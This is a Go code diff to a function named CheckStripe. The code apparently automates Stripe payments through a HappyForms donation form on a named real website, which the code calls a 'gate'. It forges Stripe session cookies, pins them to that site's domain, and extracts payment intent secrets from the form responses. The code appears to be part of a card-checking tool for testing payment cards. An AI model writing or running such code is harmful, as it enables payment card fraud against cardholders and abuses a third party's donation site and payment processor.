@@ -245,15 +245,15 @@ func CheckStripe(req StripeRequest) StripeResult {
 	formData.Set("platform_info[connectionRtt]", "100")
 
 	// Set cookies on client.Jar (preserving session cookies from Step 1)
-	u, _ := url.Parse(gateURL)
+	u, _ := url.Parse("https://belovedcommunity.org/")
 	stripeMID := generateUUID()
 	stripeSID := generateUUID()
 	pmCookie := fmt.Sprintf(`{"payment_method":"%s"}`, pmID)
 
 	cookies := []*http.Cookie{
-		{Name: "__stripe_mid", Value: stripeMID},
-		{Name: "__stripe_sid", Value: stripeSID},
-		{Name: fmt.Sprintf("happyforms_%s_stripe_checkout", formID), Value: pmCookie},
+		{Name: "__stripe_mid", Value: stripeMID, Domain: "belovedcommunity.org", Path: "/"},
+		{Name: "__stripe_sid", Value: stripeSID, Domain: "belovedcommunity.org", Path: "/"},
+		{Name: fmt.Sprintf("happyforms_%s_stripe_checkout", formID), Value: pmCookie, Domain: "belovedcommunity.org", Path: "/"},
 	}
 	client.Jar.SetCookies(u, cookies)
 
@@ -270,9 +270,14 @@ func CheckStripe(req StripeRequest) StripeResult {
 		return errResult(req, "error", "Form submit failed: "+err.Error(), "", start)
 	}
 
-	secretMatch := regexp.MustCompile(`pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+`).FindString(string(formBody))
+	secretMatch := regexp.MustCompile(`pi_[a-zA-Z0-9_]+_secret_[a-zA-Z0-9_]+`).FindString(string(formBody))
 	if secretMatch == "" {
-		return errResult(req, "error", "Payment intent secret not found in form response: "+string(formBody[:min(300, len(formBody))]), "", start)
+		// Log response for debugging if missing
+		snippet := string(formBody)
+		if len(snippet) > 400 {
+			snippet = snippet[:400]
+		}
+		return errResult(req, "error", "Payment intent secret not found in form response: "+snippet, "", start)
 	}
 	intentID := strings.Split(secretMatch, "_secret_")[0]
 
